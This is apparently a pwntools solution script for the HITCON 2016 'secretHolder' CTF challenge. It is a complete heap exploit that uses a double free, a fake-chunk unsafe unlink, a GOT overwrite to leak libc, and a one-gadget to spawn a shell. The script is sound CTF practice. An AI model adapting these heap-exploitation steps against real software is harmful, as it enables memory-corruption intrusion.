from pwn import *
from LibcSearcher import *
io = process('./secretHolder_hitcon_2016')
elf = ELF('./secretHolder_hitcon_2016')
libc = ELF("./libc-2.23.so")

small_ptr = 0x006020b0
big_ptr = 0x006020a0

def keep(idx):
	io.sendlineafter("Renew secret\n", '1')
	io.sendlineafter("Huge secret\n", str(idx))
	io.sendafter("secret: \n", 'AAAA')

def wipe(idx):
	io.sendlineafter("Renew secret\n", '2')
	io.sendlineafter("Huge secret\n", str(idx))

def renew(idx, content):
	io.sendlineafter("Renew secret\n", '3')
	io.sendlineafter("Huge secret\n", str(idx))
	io.sendafter("secret: \n", content)

def debug():
	gdb.attach(io)
	pause()

# attack1
keep(1)
wipe(1)
keep(2)		# big
wipe(1)		# double free
keep(1)		# small	# overlapping
keep(3)
wipe(3)
keep(3)		# huge
payload=p64(0)						# fake prev_size
payload+=p64(0x21)					# fake size
payload+=p64(small_ptr - 0x18)		# fake fd
payload+=p64(small_ptr - 0x10)		# fake bk
payload+=p64(0x20)					# fake prev_size of next
payload+=p64(0x61a90)				# fake size of next
renew(2,payload)	# use after free
wipe(3)				# unsafe unlink

# attack2
payload = b"A"*8
payload+=p64(elf.got['free'])	# *big_ptr = free@got.plt
payload+=b"A"*8
payload+=p64(big_ptr)			# *small_ptr = big_ptr
renew(1,payload)
renew(2,p64(elf.plt['puts']))	# *free@got.plt = puts@plt
renew(1,p64(elf.got['puts']))	# *big_ptr = puts@got.plt
wipe(2)				# puts(puts@got.plt)
puts_addr = u64(io.recvline()[:6]+b"\x00\x00")
libcbase = puts_addr-libc.symbols['puts']
print(hex(libcbase))

# attack3
onegadget = [0x4525a,0xef9f4,0xf0897]
payload = b'A'*0x10
payload+= p64(elf.got['puts'])
renew(1,payload)
renew(1,p64(libcbase+onegadget[0]))
io.interactive()